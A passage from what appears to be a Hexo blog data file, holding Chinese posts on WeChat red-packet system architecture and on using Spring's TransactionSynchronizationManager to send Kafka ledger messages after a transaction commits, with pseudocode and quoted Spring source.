src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/11.png\"><br>如上图所示，微信红包的某些步骤不实时完成也不会影响用户对红包业务可用性的体验。</p>\n<p>比如拆红包，正常的业务流程很长，但关键步骤只有订单相关的几步。</p>\n<p>至于转零钱、写红包记录等操作不需要实时。</p>\n<p>用户抢到红包时，一般不会实时去钱包查看微信零钱，而是在微信群中点开消息查看本次抢到金额和他人抢红包金额。</p>\n<p>所以拆红包时只需要从 cache 查询用户是否拆过红包，然后写入拆红包的订单记录，更新发红包订单，其他的操作都可以异步化。</p>\n<p>当然，不是每个业务都可以进行异步化设计，需要进行业务分析，判断是否存在非关键步骤之外的事情可以将其异步化，并通过异步对账保证最终一致。</p>\n<blockquote>\n<p>以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p>\n</blockquote>\n<h4 id=\"5-订单存储层-故障自愈-1\"><a href=\"#5-订单存储层-故障自愈-1\" class=\"headerlink\" title=\"5 - 订单存储层 - 故障自愈\"></a>5 - 订单存储层 - 故障自愈</h4><p>为解决 DB 间的相互影响，需要将 DB 间相互隔离，订单存储层 SET 化。</p>\n<p>SET 化指订单 DB 和订单接入 SERVER 垂直 stick 一起。业务逻辑层访问订单时，根据订单倒数第二、三位数字找到所属订单 SET，一个 SET 的请求不能路由到其他 SET。</p>\n<p>通过 SET 化得到的好处是，控制 DB 连接数、隔离故障影响和分流并发。</p>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/10.png\"><br>如上图所示，所设尾号 90-99 的 SET 故障时，如果业务逻辑服务后续不再生成属于这个 SET 的订单，那后续的业务就可以逐渐恢复。</p>\n<p>也就是在发生故障时，业务逻辑层发布一个版本，屏蔽故障号段的单号生成，就可以恢复业务。</p>\n<p>进一步想，除了人为发版本，有没有方法可以让 DB 故障时自动恢复？</p>\n<p>在 DB 故障导致业务失败时，业务逻辑层可获取到故障 DB 的号段，在发红包时，将这些故障的号段，换一个可用的号段就可恢复业务。</p>\n<p>订单号除了最后三位，前面的部分已能保证该红包唯一性，后面的数字只代表着分库表信息，故障时只需要将最后三位换另外一个 SET 便可自动恢复。</p>\n<p>完成这个设计后，即使 DB 出现故障，业务的可用性也不会有影响。</p>\n<p>这里还有一点，新的发红包请求可避免 DB 故障的影响，但那些故障之前已发出未被领取的红包，红包消息已发送到微信群，单号已确定，拆红包时还是失败。</p>\n<p>对这种情况，由于不会有增量，采用正常的主备切换解决即可。</p>\n<h4 id=\"6-订单存储层-平行扩容设计-1\"><a href=\"#6-订单存储层-平行扩容设计-1\" class=\"headerlink\" title=\"6 - 订单存储层 - 平行扩容设计\"></a>6 - 订单存储层 - 平行扩容设计</h4><p>红包系统的高可用架构设计，主要包括了部署设计、SET 化设计、异步化设计、DB 故障自愈能力建设、平行扩容设计。</p>\n<blockquote>\n<p>以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p>\n</blockquote>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>红包系统是一个高并发的资金交易系统，最大的技术挑战是保障并发性能与资金安全。</p>\n<p>这种全新的技术挑战，传统的“秒杀”系统设计方案已不能完全解决。</p>\n<p>在分析了业界“秒杀”系统解决方案的基础上，红包系统采用了 SET 化、请求排队串行化、双维度分库表等设计，形成了独特的高并发、资金安全系统解决方案。</p>\n<h2 id=\"说在最后：有问题找老架构取经\"><a href=\"#说在最后：有问题找老架构取经\" class=\"headerlink\" title=\"说在最后：有问题找老架构取经\"></a>说在最后：有问题找老架构取经</h2><p>超高并发红包架构，一定是一个超级牛掰的简历亮点项目，黄金项目，稍微晚点把全量的架构方案和视频进行发布。</p>\n<p>这个项目写入简历，面试的时候如果大家能对答如流，如数家珍，基本上 面试官会被你 震惊到、吸引到。</p>\n<p>最终，<strong>让面试官爱到 “不能自已、口水直流”</strong>。offer， 也就来了。</p>\n"},{"title":"高效支付系统架构","date":"2024-06-16T14:16:29.000Z","_content":"\n一、案例背景\n------\n\n拿支付系统相关的业务来举例。在支付系统中，我们需要记录每个账户的资金流水（记录用户A因为哪个操作扣了钱，因为哪个操作加了钱），这样我们才能对每个账户的**账**做到心中有数，对于支付系统而言，资金流水的数据可谓是**最重要**的。因此，为了防止支付系统的老大**徇私舞弊**，CTO提了一个**流水存档**的需求：要求支付系统对每个账户的资金流水做一份存档，要求支付系统在写流水的时候，把流水相关的信息以消息的形式推送到kafka，由**存档系统**消费这个消息并落地到库里（这个库只有**存档系统**拥有写权限）。整个需求的流程如下所示：\n\n![](./2024/06/16/高效支付系统架构/1.png)\n整个需求的流程还是比较简单的，考虑到后续会有其他事业部也要进行数据存档操作，CTO建议支付系统团队内部开发一个二方库，这个二方库的主要功能就是发送消息到kafka中去。\n\n二、确定方案\n------\n\n既然要求开发一个二方库，因此，我们需要考虑如下几件事情：\n\n> 1、技术栈使用的springboot，因此，这里最好以starter的方式提供\n>\n> 2、二方库需要发送消息给kafka，最好是二方库内部基于kafka生产者的api创建生产者，不要使用Spring自带的kafkaTemplate，因为集成方有可能已经使用了kafkaTemplate。不能与集成方造成冲突。\n>\n> 3、减少对接方的集成难度、学习成本，最好是提供一个简单实用的api，业务侧能简单上手。\n>\n> 4、**发送消息这个操作需要支持事务，尽量不影响主业务**\n\n在上述的几件事情中，最需要注意的应该就是第4点：**发送消息这个操作需要支持事务，尽量不影响主业务**。这是什么意思呢？首先，尽量不影响主业务，这个最简单的方式就是使用**异步**机制。\n\n如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。\n\n其次，需要支持事务是指：**假设我们的api是在事务方法内部调用的，那么我们需要保证事务提交后再执行这个api**。那么，我们的流水落地api应该要有这样的功能：\n\n![](./2024/06/16/高效支付系统架构/2.png)\n内部可以判断当前是否存在事务，如果存在事务，则需要等事务提交后再异步发送消息给kafka。如果不存在事务则直接异步发送消息给kafka。而且这样的判断逻辑得放在二方库内部才行。那现在摆在我们面前的问题就是：**我要如何判断当前是否存在事务，以及如何在事务提交后再触发我们自定义的逻辑呢？**\n\n三、TransactionSynchronizationManager显神威\n--------------------------------------\n\n这个类内部所有的变量、方法都是static修饰的，也就是说它其实是一个工具类。是一个**事务同步器**。下述是**流水落地API**的伪代码，这段代码就解决了我们上述提到的疑问：\n\n```\nprivate final ExecutorService executor = Executors.newSingleThreadExecutor();  \n  \npublic void sendLog() {  \n    // 判断当前是否存在事务  \n    if (!TransactionSynchronizationManager.isSynchronizationActive()) {  \n        // 无事务，异步发送消息给kafka  \n          \n        executor.submit(() -> {  \n            // 发送消息给kafka  \n            try {  \n                // 发送消息给kafka  \n            } catch (Exception e) {  \n                // 记录异常信息，发邮件或者进入待处理列表，让开发人员感知异常  \n            }  \n        });  \n        return;  \n    }  \n  \n    // 有事务，则添加一个事务同步器，并重写afterCompletion方法（此方法在事务提交后会做回调）  \n    TransactionSynchronizationManager.registerSynchronization(new TransactionSynchronizationAdapter() {  \n  \n        @Override  \n        public void afterCompletion(int status) {  \n            if (status == TransactionSynchronization.STATUS_COMMITTED) {  \n                // 事务提交后，再异步发送消息给kafka  \n                executor.submit(() -> {  \n                    try {  \n                     // 发送消息给kafka  \n                    } catch (Exception e) {  \n                     // 记录异常信息，发邮件或者进入待处理列表，让开发人员感知异常  \n                    }  \n                });  \n            }  \n        }  \n  \n    });  \n  \n}  \n  \n\n```\n\n代码比较简单，其主要是**TransactionSynchronizationManager**的使用。\n\n### 3.1、判断是否存在事务？TransactionSynchronizationManager.isSynchronizationActive() 方法显神威\n\n*   我们先看下这个方法的源码：\n\n\n```\n// TransactionSynchronizationManager.java类内部的部分代码  \n  \nprivate static final ThreadLocal<Set<TransactionSynchronization>> synchronizations =  \n   new NamedThreadLocal<>(\"Transaction synchronizations\");  \n  \npublic static boolean isSynchronizationActive() {  \n    return (synchronizations.get() != null);  \n}  \n  \n\n```\n```\n很明显，synchronizations是一个线程变量（ThreadLocal）。那它是在什么时候set进去的呢？这里的话，可以参考下这个方法：org.springframework.transaction.support.TransactionSynchronizationManager\\#initSynchronization，其源码如下所示：  \n\n```\n```\n/**  \n  * Activate transaction synchronization for the current thread.  \n  * Called by a transaction manager on transaction begin.  \n  * @throws IllegalStateException if synchronization is already active  \n  */  \npublic static void initSynchronization() throws IllegalStateException {  \n    if (isSynchronizationActive()) {  \n        throw new IllegalStateException(\"Cannot activate transaction synchronization - already active\");  \n    }  \n    logger.trace(\"Initializing transaction synchronization\");  \n    synchronizations.set(new LinkedHashSet<>());  \n}  \n  \n\n```\n\n由源码中的注释也可以知道，它是在事务管理器开启事务时调用的。换句话说，只要我们的程序执行到带有事务特性的方法时，就会在线程变量中放入一个LinkedHashSet，用来标识当前存在事务。只要isSynchronizationActive返回true，则代表当前有事务。因此，结合这两个方法我们是指能解决我们最开始提出的疑问：`要如何判断当前是否存在事务`\n\n### 3.2、如何在事务提交后触发自定义逻辑？TransactionSynchronizationManager.registerSynchronization()方法显神威\n\n*   我们来看下这个方法的源代码：\n\n\n```\n/**  \n  * Register a new transaction synchronization for the current thread.  \n  * Typically called by resource management code.  \n  * <p>Note that synchronizations can implement the  \n  * {@link org.springframework.core.Ordered} interface.  \n  * They will be executed in an order according to their order value (if any).  \n  * @param synchronization the synchronization object to register  \n  * @throws IllegalStateException if transaction synchronization is not active  \n  * @see org.springframework.core.Ordered  \n  */  \npublic static void registerSynchronization(TransactionSynchronization synchronization)  \n    throws IllegalStateException {  \n  \n    Assert.notNull(synchronization, \"TransactionSynchronization must not be null\");  \n    if (!isSynchronizationActive()) {  \n        throw new IllegalStateException(\"Transaction synchronization is not active\");  \n    }  \n    synchronizations.get().add(synchronization);  \n}  \n  \n\n```\n\n这里又使用到了synchronizations线程变量，我们在判断是否存在事务时，就是判断这个线程变量内部是否有值。那我们现在想在**事务提交后触发自定义逻辑**和这个有什么关系呢？\n\n如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。\n\n我们在上面构建**流水落地api**的伪代码中有向synchronizations内部添加了一个TransactionSynchronizationAdapter，内部并重写了afterCompletion方法，其代码如下所示：\n\n```\nTransactionSynchronizationManager.registerSynchronization(new TransactionSynchronizationAdapter() {  \n  \n    @Override  \n    public void afterCompletion(int status) {  \n        if (status == TransactionSynchronization.STATUS_COMMITTED) {  \n            // 事务提交后，再异步发送消息给kafka  \n            executor.submit(() -> {  \n                    try {  \n                     // 发送消息给kafka  \n                    } catch (Exception e) {  \n                     // 记录异常信息，发邮件或者进入待处理列表，让开发人员感知异常  \n                    }  \n            });  \n        }  \n    }  \n  \n});  \n  \n\n```\n\n我们结合registerSynchronization的源码来看，其实这段代码主要就是向线程变量内部的LinkedHashSet添加了一个对象而已，但就是这么一个操作，让Spring在事务执行的过程中变得`“有事情可做”`。这是什么意思呢？是因为Spring在执行事务方法时，对于操作事务的每一个阶段都有一个回调操作，比如：trigger系列的回调\n\n![](./2024/06/16/高效支付系统架构/3.png)\ninvoke系列的回调\n\n![](./2024/06/16/高效支付系统架构/4.png)\n而我们现在的需求就是在事务提交后触发自定义的函数，那就是在invokeAfterCommit和invokeAfterCompletion这两个方法来选了。首先，这两个方法都会拿到所有TransactionSynchronization的集合（其中会包括我们上述添加的TransactionSynchronizationAdapter）。但是要注意一点：invokeAfterCommit只能拿到集合，invokeAfterCompletion除了集合还有一个int类型的参数，而这个int类型的参数其实是当前事务的一种状态。也就是说，如果我们重写了invokeAfterCompletion方法，我们除了能拿到集合外，还能拿到当前事务的状态。因此，此时我们可以根据这个状态来做不同的事情，比如：可以在事务提交时做自定义处理，也可以在事务回滚时做自定义处理等等。\n\n\n\n四、总结\n----\n\n上面有说到，我们**判断当前是否存在事务、添加钩子函数**都是依赖线程变量的。因此，我们在使用过程中，一定要**避免切换线程**。否则会出现**不生效**的情况。","source":"_posts/高效支付系统架构.md","raw":"---\ntitle: 高效支付系统架构\ndate: 2024-06-16 22:16:29\ntags: 支付系统\ncategories: 架构\n---\n\n一、案例背景\n------\n\n拿支付系统相关的业务来举例。在支付系统中，我们需要记录每个账户的资金流水（记录用户A因为哪个操作扣了钱，因为哪个操作加了钱），这样我们才能对每个账户的**账**做到心中有数，对于支付系统而言，资金流水的数据可谓是**最重要**的。因此，为了防止支付系统的老大**徇私舞弊**，CTO提了一个**流水存档**的需求：要求支付系统对每个账户的资金流水做一份存档，要求支付系统在写流水的时候，把流水相关的信息以消息的形式推送到kafka，由**存档系统**消费这个消息并落地到库里（这个库只有**存档系统**拥有写权限）。整个需求的流程如下所示：\n\n![](./2024/06/16/高效支付系统架构/1.png)\n整个需求的流程还是比较简单的，考虑到后续会有其他事业部也要进行数据存档操作，CTO建议支付系统团队内部开发一个二方库，这个二方库的主要功能就是发送消息到kafka中去。\n\n二、确定方案\n------\n\n既然要求开发一个二方库，因此，我们需要考虑如下几件事情：\n\n> 1、技术栈使用的springboot，因此，这里最好以starter的方式提供\n>\n> 2、二方库需要发送消息给kafka，最好是二方库内部基于kafka生产者的api创建生产者，不要使用Spring自带的kafkaTemplate，因为集成方有可能已经使用了kafkaTemplate。不能与集成方造成冲突。\n>\n> 3、减少对接方的集成难度、学习成本，最好是提供一个简单实用的api，业务侧能简单上手。\n>\n> 4、**发送消息这个操作需要支持事务，尽量不影响主业务**\n\n在上述的几件事情中，最需要注意的应该就是第4点：**发送消息这个操作需要支持事务，尽量不影响主业务**。这是什么意思呢？首先，尽量不影响主业务，这个最简单的方式就是使用**异步**机制。\n\n如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。\n\n其次，需要支持事务是指：**假设我们的api是在事务方法内部调用的，那么我们需要保证事务提交后再执行这个api**。那么，我们的流水落地api应该要有这样的功能：\n\n![](./2024/06/16/高效支付系统架构/2.png)\n内部可以判断当前是否存在事务，如果存在事务，则需要等事务提交后再异步发送消息给kafka。如果不存在事务则直接异步发送消息给kafka。而且这样的判断逻辑得放在二方库内部才行。那现在摆在我们面前的问题就是：**我要如何判断当前是否存在事务，以及如何在事务提交后再触发我们自定义的逻辑呢？**\n\n三、TransactionSynchronizationManager显神威\n--------------------------------------\n\n这个类内部所有的变量、方法都是static修饰的，也就是说它其实是一个工具类。是一个**事务同步器**。下述是**流水落地API**的伪代码，这段代码就解决了我们上述提到的疑问：\n\n```\nprivate final ExecutorService executor = Executors.newSingleThreadExecutor();  \n  \npublic void sendLog() {  \n    // 判断当前是否存在事务  \n    if (!TransactionSynchronizationManager.isSynchronizationActive()) {  \n        // 无事务，异步发送消息给kafka  \n          \n        executor.submit(() -> {  \n            // 发送消息给kafka  \n            try {  \n                // 发送消息给kafka  \n            } catch (Exception e) {  \n                // 记录异常信息，发邮件或者进入待处理列表，让开发人员感知异常  \n            }  \n        });  \n        return;  \n    }  \n  \n    // 有事务，则添加一个事务同步器，并重写afterCompletion方法（此方法在事务提交后会做回调）  \n    TransactionSynchronizationManager.registerSynchronization(new TransactionSynchronizationAdapter() {  \n  \n        @Override  \n        public void afterCompletion(int status) {  \n            if (status == TransactionSynchronization.STATUS_COMMITTED) {  \n                // 事务提交后，再异步发送消息给kafka  \n                executor.submit(() -> {  \n                    try {  \n                     // 发送消息给kafka  \n                    } catch (Exception e) {  \n                     // 记录异常信息，发邮件或者进入待处理列表，让开发人员感知异常  \n                    }  \n                });  \n            }  \n        }  \n  \n    });  \n  \n}  \n  \n\n```\n\n代码比较简单，其主要是**TransactionSynchronizationManager**的使用。\n\n### 3.1、判断是否存在事务？TransactionSynchronizationManager.isSynchronizationActive() 方法显神威\n\n*   我们先看下这个方法的源码：\n\n\n```\n// TransactionSynchronizationManager.java类内部的部分代码  \n  \nprivate static final ThreadLocal<Set<TransactionSynchronization>> synchronizations =  \n   new NamedThreadLocal<>(\"Transaction synchronizations\");  \n  \npublic static boolean isSynchronizationActive() {  \n    return (synchronizations.get() != null);  \n}  \n  \n\n```\n```\n很明显，synchronizations是一个线程变量（ThreadLocal）。那它是在什么时候set进去的呢？这里的话，可以参考下这个方法：org.springframework.transaction.support.TransactionSynchronizationManager\\#initSynchronization，其源码如下所示：  \n\n```\n```\n/**  \n  * Activate transaction synchronization for the current thread.  \n  * Called by a transaction manager on transaction begin.  \n  * @throws IllegalStateException if synchronization is already active  \n  */  \npublic static void initSynchronization() throws IllegalStateException {  \n    if (isSynchronizationActive()) {  \n        throw new IllegalStateException(\"Cannot activate transaction synchronization - already active\");  \n    }  \n    logger.trace(\"Initializing transaction synchronization\");  \n    synchronizations.set(new LinkedHashSet<>());  \n}  \n  \n\n```\n\n由源码中的注释也可以知道，它是在事务管理器开启事务时调用的。换句话说，只要我们的程序执行到带有事务特性的方法时，就会在线程变量中放入一个LinkedHashSet，用来标识当前存在事务。只要isSynchronizationActive返回true，则代表当前有事务。因此，结合这两个方法我们是指能解决我们最开始提出的疑问：`要如何判断当前是否存在事务`\n\n### 3.2、如何在事务提交后触发自定义逻辑？TransactionSynchronizationManager.registerSynchronization()方法显神威\n\n*   我们来看下这个方法的源代码：\n\n\n```\n/**  \n  * Register a new transaction synchronization for the current thread.  \n  * Typically called by resource management code.  \n  * <p>Note that synchronizations can implement the  \n  * {@link org.springframework.core.Ordered} interface.  \n  * They will be executed in an order according to their order value (if any).  \n  * @param synchronization the synchronization object to register  \n  * @throws IllegalStateException if transaction synchronization is not active  \n  * @see org.springframework.core.Ordered  \n  */  \npublic static void registerSynchronization(TransactionSynchronization synchronization)  \n    throws IllegalStateException {  \n  \n    Assert.notNull(synchronization, \"TransactionSynchronization must not be null\");  \n    if (!isSynchronizationActive()) {  \n        throw new IllegalStateException(\"Transaction synchronization is not active\");  \n    }  \n    synchronizations.get().add(synchronization);  \n}  \n  \n\n```\n\n这里又使用到了synchronizations线程变量，我们在判断是否存在事务时，就是判断这个线程变量内部是否有值。那我们现在想在**事务提交后触发自定义逻辑**和这个有什么关系呢？\n\n如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。\n\n我们在上面构建**流水落地api**的伪代码中有向synchronizations内部添加了一个TransactionSynchronizationAdapter，内部并重写了afterCompletion方法，其代码如下所示：\n\n```\nTransactionSynchronizationManager.registerSynchronization(new TransactionSynchronizationAdapter() {  \n  \n    @Override  \n    public void afterCompletion(int status) {  \n        if (status == TransactionSynchronization.STATUS_COMMITTED) {  \n            // 事务提交后，再异步发送消息给kafka  \n            executor.submit(() -> {  \n                    try {  \n                     // 发送消息给kafka  \n                    } catch (Exception e) {  \n                     // 记录异常信息，发邮件或者进入待处理列表，让开发人员感知异常  \n                    }  \n            });  \n        }  \n    }  \n  \n});  \n  \n\n```\n\n我们结合registerSynchronization的源码来看，其实这段代码主要就是向线程变量内部的LinkedHashSet添加了一个对象而已，但就是这么一个操作，让Spring在事务执行的过程中变得`“有事情可做”`。这是什么意思呢？是因为Spring在执行事务方法时，对于操作事务的每一个阶段都有一个回调操作，比如：trigger系列的回调\n\n![](./2024/06/16/高效支付系统架构/3.png)\ninvoke系列的回调\n\n![](./2024/06/16/高效支付系统架构/4.png)\n而我们现在的需求就是在事务提交后触发自定义的函数，那就是在invokeAfterCommit和invokeAfterCompletion这两个方法来选了。首先，这两个方法都会拿到所有TransactionSynchronization的集合（其中会包括我们上述添加的TransactionSynchronizationAdapter）。但是要注意一点：invokeAfterCommit只能拿到集合，invokeAfterCompletion除了集合还有一个int类型的参数，而这个int类型的参数其实是当前事务的一种状态。也就是说，如果我们重写了invokeAfterCompletion方法，我们除了能拿到集合外，还能拿到当前事务的状态。因此，此时我们可以根据这个状态来做不同的事情，比如：可以在事务提交时做自定义处理，也可以在事务回滚时做自定义处理等等。\n\n\n\n四、总结\n----\n\n上面有说到，我们**判断当前是否存在事务、添加钩子函数**都是依赖线程变量的。因此，我们在使用过程中，一定要**避免切换线程**。否则会出现**不生效**的情况。","slug":"高效支付系统架构","published":1,"updated":"2024-06-16T14:20:53.066Z","comments":1,"layout":"post","photos":[],"_id":"clylh1ryw002kbsuh30z5egw8","content":"<h2 id=\"一、案例背景\"><a href=\"#一、案例背景\" class=\"headerlink\" title=\"一、案例背景\"></a>一、案例背景</h2><p>拿支付系统相关的业务来举例。在支付系统中，我们需要记录每个账户的资金流水（记录用户A因为哪个操作扣了钱，因为哪个操作加了钱），这样我们才能对每个账户的<strong>账</strong>做到心中有数，对于支付系统而言，资金流水的数据可谓是<strong>最重要</strong>的。因此，为了防止支付系统的老大<strong>徇私舞弊</strong>，CTO提了一个<strong>流水存档</strong>的需求：要求支付系统对每个账户的资金流水做一份存档，要求支付系统在写流水的时候，把流水相关的信息以消息的形式推送到kafka，由<strong>存档系统</strong>消费这个消息并落地到库里（这个库只有<strong>存档系统</strong>拥有写权限）。整个需求的流程如下所示：</p>\n<p><img src=\"/./2024/06/16/%E9%AB%98%E6%95%88%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/1.png\"><br>整个需求的流程还是比较简单的，考虑到后续会有其他事业部也要进行数据存档操作，CTO建议支付系统团队内部开发一个二方库，这个二方库的主要功能就是发送消息到kafka中去。</p>\n<h2 id=\"二、确定方案\"><a href=\"#二、确定方案\" class=\"headerlink\" title=\"二、确定方案\"></a>二、确定方案</h2><p>既然要求开发一个二方库，因此，我们需要考虑如下几件事情：</p>\n<blockquote>\n<p>1、技术栈使用的springboot，因此，这里最好以starter的方式提供</p>\n<p>2、二方库需要发送消息给kafka，最好是二方库内部基于kafka生产者的api创建生产者，不要使用Spring自带的kafkaTemplate，因为集成方有可能已经使用了kafkaTemplate。不能与集成方造成冲突。</p>\n<p>3、减少对接方的集成难度、学习成本，最好是提供一个简单实用的api，业务侧能简单上手。</p>\n<p>4、<strong>发送消息这个操作需要支持事务，尽量不影响主业务</strong></p>\n</blockquote>\n<p>在上述的几件事情中，最需要注意的应该就是第4点：<strong>发送消息这个操作需要支持事务，尽量不影响主业务</strong>。这是什么意思呢？首先，尽量不影响主业务，这个最简单的方式就是使用<strong>异步</strong>机制。</p>\n<p>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。</p>\n<p>其次，需要支持事务是指：<strong>假设我们的api是在事务方法内部调用的，那么我们需要保证事务提交后再执行这个api</strong>。那么，我们的流水落地api应该要有这样的功能：</p>\n<p><img src=\"/./2024/06/16/%E9%AB%98%E6%95%88%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/2.png\"><br>内部可以判断当前是否存在事务，如果存在事务，则需要等事务提交后再异步发送消息给kafka。如果不存在事务则直接异步发送消息给kafka。而且这样的判断逻辑得放在二方库内部才行。那现在摆在我们面前的问题就是：<strong>我要如何判断当前是否存在事务，以及如何在事务提交后再触发我们自定义的逻辑呢？</strong></p>\n<h2 id=\"三、TransactionSynchronizationManager显神威\"><a href=\"#三、TransactionSynchronizationManager显神威\" class=\"headerlink\" title=\"三、TransactionSynchronizationManager显神威\"></a>三、TransactionSynchronizationManager显神威</h2><p>这个类内部所有的变量、方法都是static修饰的，也就是说它其实是一个工具类。是一个<strong>事务同步器</strong>。下述是<strong>流水落地API</strong>的伪代码，这段代码就解决了我们上述提到的疑问：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">private final ExecutorService executor = Executors.newSingleThreadExecutor();  </span><br><span class=\"line\">  </span><br><span class=\"line\">public void sendLog() &#123;  </span><br><span class=\"line\">    // 判断当前是否存在事务  </span><br><span class=\"line\">    if (!TransactionSynchronizationManager.isSynchronizationActive()) &#123;  </span><br><span class=\"line\">        // 无事务，异步发送消息给kafka  </span><br><span class=\"line\">          </span><br><span class=\"line\">        executor.submit(() -&gt; &#123;  </span><br><span class=\"line\">            // 发送消息给kafka  </span><br><span class=\"line\">            try &#123;  </span><br><span class=\"line\">                // 发送消息给kafka  </span><br><span class=\"line\">            &#125; catch (Exception e) &#123;  </span><br><span class=\"line\">                // 记录异常信息，发邮件或者进入待处理列表，让开发人员感知异常  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;);  </span><br><span class=\"line\">        return;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    // 有事务，则添加一个事务同步器，并重写afterCompletion方法（此方法在事务提交后会做回调）  </span><br><span class=\"line\">    TransactionSynchronizationManager.registerSynchronization(new TransactionSynchronizationAdapter() &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        @Override  </span><br><span class=\"line\">        public void afterCompletion(int status) &#123;  </span><br><span class=\"line\">            if (status == TransactionSynchronization.STATUS_COMMITTED) &#123;  </span><br><span class=\"line\">                // 事务提交后，再异步发送消息给kafka  </span><br><span class=\"line\">                executor.submit(() -&gt; &#123;  </span><br><span class=\"line\">                    try &#123;  </span><br><span class=\"line\">                     // 发送消息给kafka  </span><br><span class=\"line\">                    &#125; catch (Exception e) &#123;  </span><br><span class=\"line\">                     // 记录异常信息，发邮件或者进入待处理列表，让开发人员感知异常  </span><br><span class=\"line\">                    &#125;  </span><br><span class=\"line\">                &#125;);  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    &#125;);  </span><br><span class=\"line\">  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>代码比较简单，其主要是<strong>TransactionSynchronizationManager</strong>的使用。</p>\n<h3 id=\"3-1、判断是否存在事务？TransactionSynchronizationManager-isSynchronizationActive-方法显神威\"><a href=\"#3-1、判断是否存在事务？TransactionSynchronizationManager-isSynchronizationActive-方法显神威\" class=\"headerlink\" title=\"3.1、判断是否存在事务？TransactionSynchronizationManager.isSynchronizationActive() 方法显神威\"></a>3.1、判断是否存在事务？TransactionSynchronizationManager.isSynchronizationActive() 方法显神威</h3><ul>\n<li>我们先看下这个方法的源码：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// TransactionSynchronizationManager.java类内部的部分代码  </span><br><span class=\"line\">  </span><br><span class=\"line\">private static final ThreadLocal&lt;Set&lt;TransactionSynchronization&gt;&gt; synchronizations =  </span><br><span class=\"line\">   new NamedThreadLocal&lt;&gt;(&quot;Transaction synchronizations&quot;);  </span><br><span class=\"line\">  </span><br><span class=\"line\">public static boolean isSynchronizationActive() &#123;  </span><br><span class=\"line\">    return (synchronizations.get() != null);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">很明显，synchronizations是一个线程变量（ThreadLocal）。那它是在什么时候set进去的呢？这里的话，可以参考下这个方法：org.springframework.transaction.support.TransactionSynchronizationManager\\#initSynchronization，其源码如下所示：  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/**  </span><br><span class=\"line\">  * Activate transaction synchronization for the current thread.  </span><br><span class=\"line\">  * Called by a transaction manager on transaction begin.  </span><br><span class=\"line\">  * @throws IllegalStateException if synchronization is already active  </span><br><span class=\"line\">  */  </span><br><span class=\"line\">public static void initSynchronization() throws IllegalStateException &#123;  </span><br><span class=\"line\">    if (isSynchronizationActive()) &#123;  </span><br><span class=\"line\">        throw new IllegalStateException(&quot;Cannot activate transaction synchronization - already active&quot;);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    logger.trace(&quot;Initializing transaction synchronization&quot;);  </span><br><span class=\"line\">    synchronizations.set(new LinkedHashSet&lt;&gt;());  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>由源码中的注释也可以知道，它是在事务管理器开启事务时调用的。换句话说，只要我们的程序执行到带有事务特性的方法时，就会在线程变量中放入一个LinkedHashSet，用来标识当前存在事务。只要isSynchronizationActive返回true，则代表当前有事务。因此，结合这两个方法我们是指能解决我们最开始提出的疑问：<code>要如何判断当前是否存在事务</code></p>\n<h3 id=\"3-2、如何在事务提交后触发自定义逻辑？TransactionSynchronizationManager-registerSynchronization-方法显神威\"><a href=\"#3-2、如何在事务提交后触发自定义逻辑？TransactionSynchronizationManager-registerSynchronization-方法显神威\" class=\"headerlink\" title=\"3.2、如何在事务提交后触发自定义逻辑？TransactionSynchronizationManager.registerSynchronization()方法显神威\"></a>3.2、如何在事务提交后触发自定义逻辑？TransactionSynchronizationManager.registerSynchronization()方法显神威</h3><ul>\n<li>我们来看下这个方法的源代码：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/**  </span><br><span class=\"line\">  * Register a new transaction synchronization for the current thread.  </span><br><span class=\"line\">  * Typically called by resource management code.  </span><br><span class=\"line\">  * &lt;p&gt;Note that synchronizations can implement the  </span><br><span class=\"line\">  * &#123;@link org.springframework.core.Ordered&#125; interface.  </span><br><span class=\"line\">  * 